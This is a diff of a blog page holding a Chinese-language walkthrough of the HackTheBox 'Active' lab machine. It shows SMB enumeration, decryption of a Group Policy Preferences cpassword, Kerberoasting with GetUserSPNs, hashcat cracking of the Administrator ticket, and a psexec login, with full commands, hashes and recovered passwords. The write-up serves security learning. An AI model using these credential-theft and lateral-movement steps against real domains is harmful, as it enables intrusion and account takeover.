@@ -209,7 +209,7 @@ Nmap done: 1 IP address (1 host up) scanned in 79.44 seconds
 <meta property="og:url" content="https://faabbi.github.io/post/Active.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
 <title>Active</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -276,11 +276,11 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> nmap --min-rate 10000 -p- 10.129.16.7</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 10.129.16.7
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 18:36 CST
 Warning: 10.129.16.7 giving up on port because retransmission cap hit (10).
-Nmap scan report <span class="pl-k">for</span> active.htb (10.129.16.7)
+Nmap scan report for active.htb (10.129.16.7)
 Host is up (0.21s latency).
 Not shown: 64593 closed tcp ports (reset), 919 filtered tcp ports (no-response)
 PORT      STATE SERVICE
@@ -308,25 +308,25 @@ PORT      STATE SERVICE
 49170/tcp open  unknown
 49173/tcp open  unknown
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 30.43 seconds
+Nmap done: 1 IP address (1 host up) scanned in 30.43 seconds
 
 
 ┌──(.venv)─(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -O -p$port 10.129.16.7</span>
+└─# nmap -sV -sC -O -p$port 10.129.16.7
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 18:38 CST
-Nmap scan report <span class="pl-k">for</span> active.htb (10.129.16.7)
+Nmap scan report for active.htb (10.129.16.7)
 Host is up (0.28s latency).
 
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
-<span class="pl-k">|</span> dns-nsid:
-<span class="pl-k">|</span>_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-07 10:38:27Z)
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds<span class="pl-k">?</span>
-464/tcp   open  kpasswd5<span class="pl-k">?</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp   open  tcpwrapped
 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
@@ -334,8 +334,8 @@ PORT      STATE SERVICE       VERSION
 5722/tcp  open  msrpc         Microsoft Windows RPC
 9389/tcp  open  mc-nmf        .NET Message Framing
 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-<span class="pl-k">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-<span class="pl-k">|</span>_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
 49152/tcp open  msrpc         Microsoft Windows RPC
 49153/tcp open  msrpc         Microsoft Windows RPC
 49154/tcp open  msrpc         Microsoft Windows RPC
@@ -347,22 +347,23 @@ PORT      STATE SERVICE       VERSION
 49173/tcp open  msrpc         Microsoft Windows RPC
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Device type: general purpose
-Running: Microsoft Windows 2008<span class="pl-k">|</span>7<span class="pl-k">|</span>Vista<span class="pl-k">|</span>8.1
+Running: Microsoft Windows 2008|7|Vista|8.1
 OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
 OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
 Network Distance: 2 hops
-Service Info: Host: DC<span class="pl-k">;</span> OS: Windows<span class="pl-k">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
 
 Host script results:
-<span class="pl-k">|</span> smb2-time:
-<span class="pl-k">|</span>   date: 2025-12-07T10:39:28
-<span class="pl-k">|</span>_  start_date: 2025-12-07T09:32:13
-<span class="pl-k">|</span> smb2-security-mode:
-<span class="pl-k">|</span>   2:1:0:
-<span class="pl-k">|</span>_    Message signing enabled and required
+| smb2-time:
+|   date: 2025-12-07T10:39:28
+|_  start_date: 2025-12-07T09:32:13
+| smb2-security-mode:
+|   2:1:0:
+|_    Message signing enabled and required
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 79.44 seconds</pre></div>
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.44 seconds
+</code></pre>
 <h2>域控制器核心服务 (Active Directory)</h2>
 <markdown-accessiblity-table><table role="table">
 <thead>
@@ -476,8 +477,8 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 79.44 s
 <h1>立足点</h1>
 <h2>smb</h2>
 <p>有部分共享</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> smbclient -L 10.129.16.7 -N</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
+└─# smbclient -L 10.129.16.7 -N
 Anonymous login successful
 
         Sharename       Type      Comment
@@ -489,59 +490,64 @@ Anonymous login successful
         Replication     Disk
         SYSVOL          Disk      Logon server share
         Users           Disk
-Reconnecting with SMB1 <span class="pl-k">for</span> workgroup listing.
+Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.129.16.7 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
-Unable to connect with SMB1 -- no workgroup available</pre></div>
+Unable to connect with SMB1 -- no workgroup available
+</code></pre>
 <p>enum4linux跑一手看看，主要看看哪个能看吧</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> enum4linux -a 10.129.16.7</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# enum4linux -a 10.129.16.7
 //10.129.16.7/ADMIN$    Mapping: DENIED Listing: N/A Writing: N/A
 //10.129.16.7/C$        Mapping: DENIED Listing: N/A Writing: N/A
 //10.129.16.7/IPC$      Mapping: OK Listing: DENIED Writing: N/A
 //10.129.16.7/NETLOGON  Mapping: DENIED Listing: N/A Writing: N/A
 //10.129.16.7/Replication       Mapping: OK Listing: OK Writing: N/A
 //10.129.16.7/SYSVOL    Mapping: DENIED Listing: N/A Writing: N/A
-//10.129.16.7/Users     Mapping: DENIED Listing: N/A Writing: N/A</pre></div>
+//10.129.16.7/Users     Mapping: DENIED Listing: N/A Writing: N/A
+</code></pre>
 <p>Replication可以匿名拿，这共享了个Users，要是能拿到凭据，能找flag</p>
 <p>这个目录很深，直接能下的都下下来</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> smbclient //10.129.16.7/Replication</span>
-Password <span class="pl-k">for</span> [WORKGROUP<span class="pl-cce">\r</span>oot]:
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# smbclient //10.129.16.7/Replication
+Password for [WORKGROUP\root]:
 Anonymous login successful
-Try <span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span> to get a list of possible commands.
-smb: <span class="pl-cce">\&gt;</span> recurse ON       开递归
-smb: <span class="pl-cce">\&gt;</span> prompt OFF       禁用下载提示
-smb: <span class="pl-cce">\&gt;</span> mget <span class="pl-k">*</span>           全下
+Try "help" to get a list of possible commands.
+smb: \&gt; recurse ON       开递归
+smb: \&gt; prompt OFF       禁用下载提示
+smb: \&gt; mget *           全下
 
 ┌──(root㉿MJ)-[/tmp/test/active.htb]
-└─<span class="pl-c"><span class="pl-c">#</span> find ./ -type f</span>
+└─# find ./ -type f
 ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
 ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
 ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
 ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
 ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
 ./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
-./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI</pre></div>
+./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
+</code></pre>
 <p>找一下文件，第一个就有加密密码</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/active.htb]
-└─<span class="pl-c"><span class="pl-c">#</span> cat ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml</span>
-<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> encoding=<span class="pl-s"><span class="pl-pds">"</span>utf-8<span class="pl-pds">"</span></span><span class="pl-k">?</span><span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>Groups clsid=<span class="pl-s"><span class="pl-pds">"</span>{3125E937-EB16-4b4c-9934-544FC6D24D26}<span class="pl-pds">"</span></span>&gt;&lt;User clsid=<span class="pl-s"><span class="pl-pds">"</span>{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}<span class="pl-pds">"</span></span> name=<span class="pl-s"><span class="pl-pds">"</span>active.htb\SVC_TGS<span class="pl-pds">"</span></span> image=<span class="pl-s"><span class="pl-pds">"</span>2<span class="pl-pds">"</span></span> changed=<span class="pl-s"><span class="pl-pds">"</span>2018-07-18 20:46:06<span class="pl-pds">"</span></span> uid=<span class="pl-s"><span class="pl-pds">"</span>{EF57DA28-5F69-4530-A59E-AAB58578219D}<span class="pl-pds">"</span></span>&gt;&lt;Properties action=<span class="pl-s"><span class="pl-pds">"</span>U<span class="pl-pds">"</span></span> newName=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> fullName=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> description=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> cpassword=<span class="pl-s"><span class="pl-pds">"</span>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<span class="pl-pds">"</span></span> changeLogon=<span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span> noChange=<span class="pl-s"><span class="pl-pds">"</span>1<span class="pl-pds">"</span></span> neverExpires=<span class="pl-s"><span class="pl-pds">"</span>1<span class="pl-pds">"</span></span> acctDisabled=<span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span> userName=<span class="pl-s"><span class="pl-pds">"</span>active.htb\SVC_TGS<span class="pl-pds">"</span></span>/&gt;&lt;/User<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>/Groups<span class="pl-k">&gt;</span></pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/active.htb]
+└─# cat ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;&lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"&gt;&lt;Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/&gt;&lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre>
 <p>问手ai就知道是<br>
 <strong>Windows 组策略首选项 (Group Policy Preferences, GPP)</strong> 文件</p>
 <p>这个加密机制是 <strong>AES-256</strong>，但微软在所有版本的 GPP 中都使用了<strong>硬编码（Hardcoded）的对称密钥</strong>。这意味着只要你知道这个密钥，你就可以解密任何 GPP 文件中的 <code class="notranslate">cpassword</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/active.htb]
-└─<span class="pl-c"><span class="pl-c">#</span> gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span>
-GPPstillStandingStrong2k18</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/active.htb]
+└─# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+GPPstillStandingStrong2k18
+</code></pre>
 <p>直接就解出来了，不过靶机没开3389和5985，可以用这个用户smb连上拿个user</p>
 <p>RDP (3389/tcp)<strong>远程桌面登录。Remote Desktop Users</strong> 组成员<br>
 <strong>WinRM (5985/tcp)通过 PowerShell 远程执行命令。Remote Management Users</strong> 组成员</p>
 <h2>提权</h2>
 <p><code class="notranslate">GetUserSPNs</code> 脚本能找出和普通用户账户关联的 <strong>SPN</strong>，并以 <strong>JtR (John the Ripper)</strong> 和 <strong>Hashcat</strong> 兼容的格式输出。</p>
 <p>简单的说，当前用户通过 <strong>GetUserSPNs</strong> 查询服务和用户之间的关联，尤其是 <strong>admin</strong> 用户所管理的服务。如果<strong>admin</strong>用户的配置存在漏洞（例如，禁用了预身份验证，或者是注册了服务账户），那么工具就能够抓取到加密的密码哈希，进一步可以进行密码破解。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request -dc-ip 10.129.16.7  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
+└─# GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request -dc-ip 10.129.16.7  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 
 ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
 --------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
@@ -550,11 +556,13 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 
 
 [-] CCache file is not found. Skipping...
-$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d03a216bd503e4eff6c12636d47af10f$698bbec4d88e9fe4bb78f1c53454ffcca88cafeb09a66246e37706b50e0d2691a2d2fb573b5730f402378b39ef883668fd64a942063b178ef52989687f5eebdc4a9bed89d83b9957725aebb935043ea0da949bbdf54987d67222d10858e6c22e2a3c93802008ce8f5bf52dcc0b42b3071aa3caf5830f91b7c7344d4ea72c8cda4b3415a9e175fabe4c30ea52452338bb252d36eca7713c51466b88cb09f0c2418ecd70cf57a463ffb346582e1867b39633acff87baa87b503554a9b9cba14120d7926c8deb5c702459f821050415369627bd2a04094a765d2d91c59a7bd287b4e851782a860e843836e6ea0a1e8da68a141628066af43f50081e600323d89c90e18850235d75b16ee1d2db70f218e83c5e1813158c2f8ea1297c43e1af699d88e8cc8ad38b0ee1f0148d88e80e415ecea052432418444b0f575cb947a87af7247809bd9003dd7dc5671394573435382034657a4090b58b0fe5a915ea0dcbbeccc661118ac08bf2ee56c6ee43ae7eaf06991cb2c4dbc7326a47b9847d619604fff0bbf22f3576a97f370ebddaa2209e8cb42695af5b8e0ba39201caa7b728501f4007c0247b01790e9ad424e359d5ebcad66bc2779485cf65415436d63d5fdbb737def139cda0a46fd9d8fc51b5b958a56cb4f7121812a6ca5450268fb738e1676825ed21780a46bebb42b7f50e3a7b158e684a7ed42bf2ecc07a383720f518d47d37657caa1577a1c14d39a277e453e4d208b54028605b96e95c3d98c856b831ec61ba54734adef9552b5c6374ca65e5f89c781537e3b3fcbdd7743ba3b666ead95939f80adf0a19832299a947f5e9f6b3b4960fbc262d605d58cfaeec926ff145d8089b9623b7a804344eaee615cb89c7774ca23afe34b8aaab9227cd872321b5298768df2ad12cae97920ba73547be209eb0407824fe95e07faae0a5c060eea5b2c8518f44c63b9c1b76eb8f53c337d62dda04545f399fd31d95b51a10b174c8d78000c6372409953aab81bec626f1fa8c5133c9d18a6034fea98079df4175b0236399d8251bb3ff125a153910e7a5870071821a7db7817005e1f4a98f2fd946d30b489393a8925c335caccfceaa20a481a8f30a381c11eab44766ba03c1e20cc109f414b26b9b59d51f520cdce6e27aab14d34361378dfbf949234496f443a7f00c1a176d40790f58ff159cbaf9e630102bc5714283db5aee9f0e88210c9ad0da88f2674cde60a58ae9b61bb79884d3c99c4a93e1be94693f</pre></div>
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d03a216bd503e4eff6c12636d47af10f$698bbec4d88e9fe4bb78f1c53454ffcca88cafeb09a66246e37706b50e0d2691a2d2fb573b5730f402378b39ef883668fd64a942063b178ef52989687f5eebdc4a9bed89d83b9957725aebb935043ea0da949bbdf54987d67222d10858e6c22e2a3c93802008ce8f5bf52dcc0b42b3071aa3caf5830f91b7c7344d4ea72c8cda4b3415a9e175fabe4c30ea52452338bb252d36eca7713c51466b88cb09f0c2418ecd70cf57a463ffb346582e1867b39633acff87baa87b503554a9b9cba14120d7926c8deb5c702459f821050415369627bd2a04094a765d2d91c59a7bd287b4e851782a860e843836e6ea0a1e8da68a141628066af43f50081e600323d89c90e18850235d75b16ee1d2db70f218e83c5e1813158c2f8ea1297c43e1af699d88e8cc8ad38b0ee1f0148d88e80e415ecea052432418444b0f575cb947a87af7247809bd9003dd7dc5671394573435382034657a4090b58b0fe5a915ea0dcbbeccc661118ac08bf2ee56c6ee43ae7eaf06991cb2c4dbc7326a47b9847d619604fff0bbf22f3576a97f370ebddaa2209e8cb42695af5b8e0ba39201caa7b728501f4007c0247b01790e9ad424e359d5ebcad66bc2779485cf65415436d63d5fdbb737def139cda0a46fd9d8fc51b5b958a56cb4f7121812a6ca5450268fb738e1676825ed21780a46bebb42b7f50e3a7b158e684a7ed42bf2ecc07a383720f518d47d37657caa1577a1c14d39a277e453e4d208b54028605b96e95c3d98c856b831ec61ba54734adef9552b5c6374ca65e5f89c781537e3b3fcbdd7743ba3b666ead95939f80adf0a19832299a947f5e9f6b3b4960fbc262d605d58cfaeec926ff145d8089b9623b7a804344eaee615cb89c7774ca23afe34b8aaab9227cd872321b5298768df2ad12cae97920ba73547be209eb0407824fe95e07faae0a5c060eea5b2c8518f44c63b9c1b76eb8f53c337d62dda04545f399fd31d95b51a10b174c8d78000c6372409953aab81bec626f1fa8c5133c9d18a6034fea98079df4175b0236399d8251bb3ff125a153910e7a5870071821a7db7817005e1f4a98f2fd946d30b489393a8925c335caccfceaa20a481a8f30a381c11eab44766ba03c1e20cc109f414b26b9b59d51f520cdce6e27aab14d34361378dfbf949234496f443a7f00c1a176d40790f58ff159cbaf9e630102bc5714283db5aee9f0e88210c9ad0da88f2674cde60a58ae9b61bb79884d3c99c4a93e1be94693f
+</code></pre>
 <p>这里就是配置不当，admin被注册了445的服务账户，所以通过<strong>SPN</strong>抓到了密码hash</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> hashcat -m 13100 hash.txt --show</span>
-$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d03a216bd503e4eff6c12636d47af10f$698bbec4d88e9fe4bb78f1c53454ffcca88cafeb09a66246e37706b50e0d2691a2d2fb573b5730f402378b39ef883668fd64a942063b178ef52989687f5eebdc4a9bed89d83b9957725aebb935043ea0da949bbdf54987d67222d10858e6c22e2a3c93802008ce8f5bf52dcc0b42b3071aa3caf5830f91b7c7344d4ea72c8cda4b3415a9e175fabe4c30ea52452338bb252d36eca7713c51466b88cb09f0c2418ecd70cf57a463ffb346582e1867b39633acff87baa87b503554a9b9cba14120d7926c8deb5c702459f821050415369627bd2a04094a765d2d91c59a7bd287b4e851782a860e843836e6ea0a1e8da68a141628066af43f50081e600323d89c90e18850235d75b16ee1d2db70f218e83c5e1813158c2f8ea1297c43e1af699d88e8cc8ad38b0ee1f0148d88e80e415ecea052432418444b0f575cb947a87af7247809bd9003dd7dc5671394573435382034657a4090b58b0fe5a915ea0dcbbeccc661118ac08bf2ee56c6ee43ae7eaf06991cb2c4dbc7326a47b9847d619604fff0bbf22f3576a97f370ebddaa2209e8cb42695af5b8e0ba39201caa7b728501f4007c0247b01790e9ad424e359d5ebcad66bc2779485cf65415436d63d5fdbb737def139cda0a46fd9d8fc51b5b958a56cb4f7121812a6ca5450268fb738e1676825ed21780a46bebb42b7f50e3a7b158e684a7ed42bf2ecc07a383720f518d47d37657caa1577a1c14d39a277e453e4d208b54028605b96e95c3d98c856b831ec61ba54734adef9552b5c6374ca65e5f89c781537e3b3fcbdd7743ba3b666ead95939f80adf0a19832299a947f5e9f6b3b4960fbc262d605d58cfaeec926ff145d8089b9623b7a804344eaee615cb89c7774ca23afe34b8aaab9227cd872321b5298768df2ad12cae97920ba73547be209eb0407824fe95e07faae0a5c060eea5b2c8518f44c63b9c1b76eb8f53c337d62dda04545f399fd31d95b51a10b174c8d78000c6372409953aab81bec626f1fa8c5133c9d18a6034fea98079df4175b0236399d8251bb3ff125a153910e7a5870071821a7db7817005e1f4a98f2fd946d30b489393a8925c335caccfceaa20a481a8f30a381c11eab44766ba03c1e20cc109f414b26b9b59d51f520cdce6e27aab14d34361378dfbf949234496f443a7f00c1a176d40790f58ff159cbaf9e630102bc5714283db5aee9f0e88210c9ad0da88f2674cde60a58ae9b61bb79884d3c99c4a93e1be94693f:Ticketmaster1968</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
+└─# hashcat -m 13100 hash.txt --show
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d03a216bd503e4eff6c12636d47af10f$698bbec4d88e9fe4bb78f1c53454ffcca88cafeb09a66246e37706b50e0d2691a2d2fb573b5730f402378b39ef883668fd64a942063b178ef52989687f5eebdc4a9bed89d83b9957725aebb935043ea0da949bbdf54987d67222d10858e6c22e2a3c93802008ce8f5bf52dcc0b42b3071aa3caf5830f91b7c7344d4ea72c8cda4b3415a9e175fabe4c30ea52452338bb252d36eca7713c51466b88cb09f0c2418ecd70cf57a463ffb346582e1867b39633acff87baa87b503554a9b9cba14120d7926c8deb5c702459f821050415369627bd2a04094a765d2d91c59a7bd287b4e851782a860e843836e6ea0a1e8da68a141628066af43f50081e600323d89c90e18850235d75b16ee1d2db70f218e83c5e1813158c2f8ea1297c43e1af699d88e8cc8ad38b0ee1f0148d88e80e415ecea052432418444b0f575cb947a87af7247809bd9003dd7dc5671394573435382034657a4090b58b0fe5a915ea0dcbbeccc661118ac08bf2ee56c6ee43ae7eaf06991cb2c4dbc7326a47b9847d619604fff0bbf22f3576a97f370ebddaa2209e8cb42695af5b8e0ba39201caa7b728501f4007c0247b01790e9ad424e359d5ebcad66bc2779485cf65415436d63d5fdbb737def139cda0a46fd9d8fc51b5b958a56cb4f7121812a6ca5450268fb738e1676825ed21780a46bebb42b7f50e3a7b158e684a7ed42bf2ecc07a383720f518d47d37657caa1577a1c14d39a277e453e4d208b54028605b96e95c3d98c856b831ec61ba54734adef9552b5c6374ca65e5f89c781537e3b3fcbdd7743ba3b666ead95939f80adf0a19832299a947f5e9f6b3b4960fbc262d605d58cfaeec926ff145d8089b9623b7a804344eaee615cb89c7774ca23afe34b8aaab9227cd872321b5298768df2ad12cae97920ba73547be209eb0407824fe95e07faae0a5c060eea5b2c8518f44c63b9c1b76eb8f53c337d62dda04545f399fd31d95b51a10b174c8d78000c6372409953aab81bec626f1fa8c5133c9d18a6034fea98079df4175b0236399d8251bb3ff125a153910e7a5870071821a7db7817005e1f4a98f2fd946d30b489393a8925c335caccfceaa20a481a8f30a381c11eab44766ba03c1e20cc109f414b26b9b59d51f520cdce6e27aab14d34361378dfbf949234496f443a7f00c1a176d40790f58ff159cbaf9e630102bc5714283db5aee9f0e88210c9ad0da88f2674cde60a58ae9b61bb79884d3c99c4a93e1be94693f:Ticketmaster1968
+</code></pre>
 <p>很容易就拿到admin的凭据了，psexec就能上终端</p>
 <h3>SY这个用户不能上的原因是</h3>
 <h4>1. 写入管理共享的权限（<code class="notranslate">ADMIN$</code> 和 <code class="notranslate">C$</code>）</h4>
@@ -585,8 +593,9 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d03a216bd503e4ef
 <p><strong>结果：</strong> 同样地，只有本地管理员或具有特定服务管理权限的用户才能执行这些操作。<code class="notranslate">SVC_TGS</code> 不具备这些权限，导致执行失败。</p>
 </li>
 </ul>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> psexec.py active.htb/Administrator:Ticketmaster1968@10.129.16.7</span></pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
+└─# psexec.py active.htb/Administrator:Ticketmaster1968@10.129.16.7
+</code></pre>
 <p>连上即可拿到root</p>
 <h1>总结</h1>
 <p>虽然是台AD域，但是其实很简单，主要是对windows以及域不够熟悉，所以开始看起来会比较懵一点，不过复盘一下，其实也就</p>
